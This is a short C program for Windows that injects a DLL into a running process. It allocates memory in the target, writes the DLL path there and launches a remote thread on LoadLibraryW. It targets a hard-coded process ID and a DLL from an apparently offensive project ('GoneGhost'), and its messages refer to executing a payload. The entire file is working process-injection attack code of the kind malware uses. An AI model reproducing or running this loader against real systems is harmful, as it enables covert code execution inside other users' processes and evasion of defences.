#include <Windows.h>
#include <stdio.h>
#include "WinApi.h"

// Utility macros
#define PRINTA(STR, ...)                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }

BOOL InjectDllToRemoteProcess( IN HANDLE hProcess, IN LPWSTR DllName )
{
	BOOL bSTATE = TRUE;

	LPVOID pLoadLibraryW = NULL;
	LPVOID pAddress = NULL;

	// fetching the size of DllName *in bytes* 
	DWORD dwSizeToWrite = lstrlenW( DllName ) * sizeof( WCHAR );

	SIZE_T lpNumberOfBytesWritten = NULL;

	HANDLE hThread = NULL;

	pLoadLibraryW = GetProcAddress( GetModuleHandle( L"kernel32.dll" ), "LoadLibraryW" );
	if ( pLoadLibraryW == NULL )
	{
		PRINTA( "[!] GetProcAddress Failed With Error : %d \n", GetLastError() );
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx( hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	if ( pAddress == NULL )
	{
		PRINTA( "[!] VirtualAllocEx Failed With Error : %d \n", GetLastError() );
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	PRINTA( "[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite );
	PRINTA( "[#] Press <Enter> To Write ... " );

	if ( !WriteProcessMemory( hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten ) ||
		lpNumberOfBytesWritten != dwSizeToWrite )
	{
		PRINTA( "[!] WriteProcessMemory Failed With Error : %d \n", GetLastError() );
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	PRINTA( "[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten );
	PRINTA( "[#] Press <Enter> To Run ... " );

	PRINTA( "[i] Executing Payload ... " );
	hThread = CreateRemoteThread( hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL );
	if ( hThread == NULL )
	{
		PRINTA( "[!] CreateRemoteThread Failed With Error : %d \n", GetLastError() );
		bSTATE = FALSE;
		goto _EndOfFunction;
	}
	PRINTA( "[+] DONE !\n" );


_EndOfFunction:
	if ( hThread )
		CloseHandle( hThread );
	return bSTATE;
}

int main( void )
{
	HANDLE hProcess = NULL;

	hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, 1332 );
	if ( !hProcess )
	{
		PRINTA( "(-) OpenProcess failed : %d\n", GetLastError() );
		return -1;
	}
	PRINTA( "(i) Got the handle ... \n" );

	if ( !InjectDllToRemoteProcess(
		hProcess, L"C:\\Users\\Cappybara\\Desktop\\Projects\\GoneGhost\\$Build\\x64DLL.dll" ) )
	{
		return -1;
	}
	PRINTA( "(+) Injected in the process ... \n" );


	return 0;
}
